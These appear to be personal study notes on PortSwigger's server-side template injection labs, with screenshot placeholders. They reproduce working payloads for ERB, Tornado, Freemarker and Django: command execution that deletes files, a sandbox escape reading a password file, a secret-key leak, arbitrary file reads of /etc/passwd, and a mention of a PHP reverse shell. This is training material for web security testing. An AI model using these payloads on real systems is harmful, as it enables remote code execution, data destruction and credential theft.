https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

Example of a template where user input is reflected (could be website form template/ email templates etc...)
	![[Pasted image 20241008200755.png]]

- Once we have identified the reflection of our user-controlled input --> enumerate the templating engine(by trying different payloads in order to be validated) -->  specific template documentation research for injection methodologies.

	![[Pasted image 20241008200509.png]]

		![[Pasted image 20241008201457.png]]
## **1.  Basic server-side template injection**
This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to the unsafe construction of an ERB template.
1. Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.
2. In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page.
3. Use ERB template syntax to create a test payload containing a mathematical operation, for example:
    `<%= 7*7 %>`
4. URL-encode this payload and insert it as the value of the `message` parameter in the URL as follows, remembering to replace `YOUR-LAB-ID` with your own lab ID:
    `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>`
5. Load the URL in the browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.
6. From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands.
7. Construct a payload to delete Carlos's file as follows:
    `<%= system("rm /home/carlos/morale.txt") %>`
8. URL-encode your payload and insert it as the value of the `message` parameter, remembering to replace `YOUR-LAB-ID` with your own lab ID:
    `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

Analysis:
	![[Pasted image 20241008202239.png]]
- send request to intruder --> fuzzing with a specific list of payloads --> we have discovered that template used is ERB(Ruby) by our payload confirmation
	![[Pasted image 20241008202635.png]]
- using ruby documentation (hacktricks/SSTI) inject desired command
	![[Pasted image 20241008203010.png]]

## **2. Basic server-side template injection (code context)**
This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
2. Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname. When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter.
3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely `POST /my-account/change-blog-post-author-display`, and send it to Burp Repeater.
4. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as `{{someExpression}}`. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows:
    `blog-post-author-display=user.name}}{{7*7}}`
5. Reload the page containing your test comment. Notice that the username now says `Peter Wiener49}}`, indicating that a server-side template injection vulnerability may exist in the code context.
6. In the Tornado documentation, identify the syntax for executing arbitrary Python:
    `{% somePython %}`
7. Study the Python documentation to discover that by importing the `os` module, you can use the `system()` method to execute arbitrary system commands.
8. Combine this knowledge to construct a payload that deletes Carlos's file:
    `{% import os %} {{os.system('rm /home/carlos/morale.txt')`
9. In Burp Repeater, go back to `POST /my-account/change-blog-post-author-display`. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows:
    `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
10. Reload the page containing your comment to execute the template and solve the lab.

Analysis:
- "My account" page, we can select whether we want the site to use full name, first name, or nickname. When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter. We will send the `POST /my-account/change-blog-post-author-display` to repeater.
	![[Pasted image 20241009004227.png]]

- we try to inject different payloads in the comment section to see how the application respond and what is reflected back, however, the only thing reflected is the username (in our case was selected only `first.name`) so we will do our approach from there on.
	![[Pasted image 20241009005523.png]]

- changing to `user.doesnotexist` will trigger an error from where we can see the template that is used (tornado) --> we will search the specific documentation on hacktricks
	![[Pasted image 20241009010741.png]]
		![[Pasted image 20241009010936.png]]

- we need to close the curly brackets
	![[Pasted image 20241009011106.png]]
	![[Pasted image 20241009012034.png]]

## **3. Server-side template injection using documentation**
This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection). To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`

1. Log in and edit one of the product description templates. Notice that this template engine uses the syntax `${someExpression}` to render the result of an expression on the page. Either enter your own expression or change one of the existing ones to refer to an object that doesn't exist, such as `${foobar}`, and save the template. The error message in the output shows that the Freemarker template engine is being used.
2. Study the Freemarker documentation and find that appendix contains an FAQs section with the question "Can I allow users to upload templates and what are the security implications?". The answer describes how the `new()` built-in can be dangerous.
3. Go to the "Built-in reference" section of the documentation and find the entry for `new()`. This entry further describes how `new()` is a security concern because it can be used to create arbitrary Java objects that implement the `TemplateModel` interface.
4. Load the JavaDoc for the `TemplateModel` class, and review the list of "All Known Implementing Classes".
5. Observe that there is a class called `Execute`, which can be used to execute arbitrary shell commands
6. Either attempt to construct your own exploit, or find [@albinowax's exploit](https://portswigger.net/research/server-side-template-injection) on our research page and adapt it as follows:
    `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
7. Remove the invalid syntax that you entered earlier, and insert your new payload into the template. Save the template and view the product page to solve the lab.

Analysis:
- we observe that we have a default template (edit template feature on product stock)
	![[Pasted image 20241009021545.png]]

- we will trigger an error condition by modifying with a non-existent template
	![[Pasted image 20241009021825.png]]

- we have identified the template (`FreeMarker.java`) --> research for a ssti exploit on hacktricks 
	![[Pasted image 20241009022024.png]]
	- we will modify the payload on `${ex("id")}` --> `${ex("rm /home/carlos/...")}`	
	  ![[Pasted image 20241009022149.png]]

## **4. Server-side template injection with information disclosure via user-supplied objects**
This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`

1. Log in and edit one of the product description templates.
2. Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. The error message in the output hints that the Django framework is being used.
3. Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
4. In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in:
    
    `{% debug %}`
5. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
6. Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
7. In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
8. Save the template to output the framework's secret key.

Analysis:
- trying to generate an error injecting custom text: if it does not throw an error --> inject some arbitrary code (in our case Jinjava seems pretty alike)
![[Pasted image 20241013052921.png]]
![[Pasted image 20241013053547.png]]

![[Pasted image 20241013053647.png]]

- searching for "django ssti"  we find some pretty useful information
  ![[Pasted image 20241013053915.png]]
	![[Pasted image 20241013054104.png]]
	![[Pasted image 20241013054433.png]]

- checking django settings documentation we find out how leak the secret key 
  ![[Pasted image 20241013055646.png]]
	  ![[Pasted image 20241013055815.png]]

## **5. Server-side template injection in a sandboxed environment**
This lab uses the Freemarker template engine. It is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file `my_password.txt` from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`

1. Log in and edit one of the product description templates. Notice that you have access to the `product` object.
2. Load the JavaDoc for the `Object` class to find methods that should be available on all objects. Confirm that you can execute `${object.getClass()}` using the `product` object.
3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as:
`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
4. Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.
5. Convert the returned bytes to ASCII.

Analysis:

- generated an error for template disclosure
	![[Pasted image 20241013180605.png]]
	![[Pasted image 20241013180751.png]]

- doing the necessary modifications
  ![[Pasted image 20241013181056.png]]
		![[Pasted image 20241013181218.png]]

# **6. Server-side template injection with a custom exploit (to be redone)**
This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection). To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

1. While proxying traffic through Burp, log in and post a comment on one of the blogs.
2. Go to the "My account" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the `user` object.
3. Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called `user.setAvatar()`. Also take note of the file path `/home/carlos/User.php`. You will need this later.
4. Upload a valid image as your avatar and load the page containing your test comment.
5. In Burp Repeater, open the `POST` request for changing your preferred name and use the `blog-post-author-display` parameter to set an arbitrary file as your avatar:
    `user.setAvatar('/etc/passwd')`
6. Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template:
    `user.setAvatar('/etc/passwd','image/jpg')`
7. To read the file, load the avatar using `GET /avatar?avatar=wiener`. This will return the contents of the `/etc/passwd` file, confirming that you have access to arbitrary files.
8. Repeat this process to read the PHP file that you noted down earlier:
    `user.setAvatar('/home/carlos/User.php','image/jpg')`
9. In the PHP file, Notice that you have access to the `gdprDelete()` function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.
10. First set the target file as your avatar, then view the comment to execute the template:
    `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')`
11. Invoke the `user.gdprDelete()` method and view your comment again to solve the lab.


Analysis:

- we will make use of the upload avatar application feature 
	![[Pasted image 20241013193031.png]]

- created a php reverse shell file (RCE file)
	![[Pasted image 20241013193230.png]]

- after uploading the malicious file we get the following error:
  ![[Pasted image 20241013194050.png]]
	![[Pasted image 20241013194445.png]]

- we need to provide as an argument a image 
	![[Pasted image 20241013194750.png]]

- after the avatar will be updated --> copy image link --> intercept with burp and see the disclosed specified file content
	![[Pasted image 20241013194854.png]]
	
